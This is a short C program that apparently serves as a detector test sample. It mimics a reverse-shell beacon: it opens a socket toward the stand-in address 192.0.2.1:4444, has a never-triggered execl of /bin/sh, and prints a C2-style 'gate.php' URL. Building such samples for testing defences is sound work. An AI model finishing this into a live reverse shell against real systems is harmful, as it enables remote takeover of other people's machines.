#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

__attribute__((noinline)) static void report_target(void) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(4444);
    a.sin_addr.s_addr = inet_addr("192.0.2.1");
    if (getenv("CROWBAR_TEST_NEVER_SET_12345") != NULL) {
        execl("/bin/sh", "sh", (char *)0);
    }
    printf("connecting to %s\n", "http://192.0.2.1:4444/gate.php");
    (void)s;
}

int main(void) {
    report_target();
    return 0;
}
